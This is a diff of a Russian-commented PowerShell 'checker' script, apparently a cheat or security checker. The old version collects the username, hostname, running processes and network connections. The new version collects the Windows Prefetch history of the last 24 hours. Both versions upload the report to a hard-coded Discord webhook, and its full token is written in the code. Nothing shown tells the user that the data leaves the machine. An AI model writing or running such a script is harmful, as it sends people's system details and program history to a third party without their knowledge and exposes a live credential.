@@ -1,39 +1,72 @@
-# === Checker.ps1 ===
-$dumpPath = "C:\Temp\Dump"
-$logFile = "$dumpPath\report.txt"
-$webhookUrl = "https://discord.com/api/webhooks/1400518810921996318/GPMDV5fgPB6s7W2ZYU03q0DxO4zWx5dYKrgnYOg7JomlpuSwIfn9T9IwrlpPzXto6BfZ" 
+# checker.ps1
 
-# Создаём папку для лога
+$prefetchPath = "$env:SystemRoot\Prefetch"
+$dumpPath = "C:\Temp\Dump"
+$logFile = "$dumpPath\PrefetchLast24h.txt"
+$webhookUrl = "https://discord.com/api/webhooks/1400518810921996318/GPMDV5fgPB6s7W2ZYU03q0DxO4zWx5dYKrgnYOg7JomlpuSwIfn9T9IwrlpPzXto6BfZ"
+
+# Создаем папку для отчета
 New-Item -Path $dumpPath -ItemType Directory -Force | Out-Null
 
-# Записываем базовую информацию
-"🕵️‍♂️ Security Check — $(Get-Date)" | Out-File $logFile -Encoding utf8
-"User: $(whoami)" | Out-File $logFile -Append -Encoding utf8
-"Hostname: $env:COMPUTERNAME" | Out-File $logFile -Append -Encoding utf8
+# Получаем файлы за последние 24 часа
+$since = (Get-Date).AddDays(-1)
+$files = Get-ChildItem -Path $prefetchPath -Filter *.pf | Where-Object { $_.LastWriteTime -ge $since }
 
-# Логируем топ 10 процессов по CPU
-"`n--- Top Processes by CPU ---" | Out-File $logFile -Append -Encoding utf8
-Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 |
-    Format-Table -AutoSize | Out-String | Out-File $logFile -Append -Encoding utf8
-
-# Логируем активные TCP-соединения
-"`n--- Active Connections ---" | Out-File $logFile -Append -Encoding utf8
-netstat -ano | Select-String "ESTABLISHED" | Out-File $logFile -Append -Encoding utf8
-
-# Читаем лог для отправки
-$logText = Get-Content -Path $logFile -Raw
-
-# Формируем JSON-пayload для Discord
-$payload = @{
-    content = "🧾 Новый лог с ПК `$(whoami)`"
-    embeds = @(@{
-        title       = "Security Log"
-        description = "```$logText```"
-        color       = 5814783
-        footer      = @{ text = "Checker by Марс" }
-        timestamp   = (Get-Date).ToString("o")
-    })
+if ($files.Count -eq 0) {
+    "За последние 24 часа файлов Prefetch не найдено." | Out-File $logFile -Encoding utf8
+} else {
+    $files | ForEach-Object {
+        $exeName = $_.Name -replace "-[A-F0-9]{8}\.pf$",""
+        "{0,-40} {1}" -f $exeName, $_.LastWriteTime
+    } | Out-File $logFile -Encoding utf8
 }
 
-# Отправляем POST-запрос в Discord
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 4) -ContentType 'application/json'
+# Формируем тело запроса с файлом вложением
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = "`r`n"
+
+# Читаем содержимое файла в байты
+$fileBytes = [System.IO.File]::ReadAllBytes($logFile)
+
+$bodyLines = @(
+    "--$boundary"
+    'Content-Disposition: form-data; name="file"; filename="PrefetchLast24h.txt"'
+    'Content-Type: text/plain'
+    ''
+)
+
+# Добавляем содержимое файла (будем добавлять бинарно, ниже)
+$bodyEnd = @(
+    ''
+    "--$boundary--"
+    ''
+)
+
+# Создаем MemoryStream для всего тела запроса
+$ms = New-Object System.IO.MemoryStream
+$sw = New-Object System.IO.StreamWriter($ms, [System.Text.Encoding]::ASCII)
+
+# Пишем заголовки и тело
+foreach ($line in $bodyLines) {
+    $sw.Write($line + $LF)
+}
+$sw.Flush()
+
+# Записываем бинарные данные файла
+$ms.Write($fileBytes, 0, $fileBytes.Length)
+
+# Пишем завершающие строки
+foreach ($line in $bodyEnd) {
+    $sw.Write($line + $LF)
+}
+$sw.Flush()
+
+# Возвращаем поток в начало
+$ms.Position = 0
+
+# Отправляем запрос
+Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $ms -ContentType "multipart/form-data; boundary=$boundary"
+
+# Закрываем поток
+$sw.Dispose()
+$ms.Dispose()
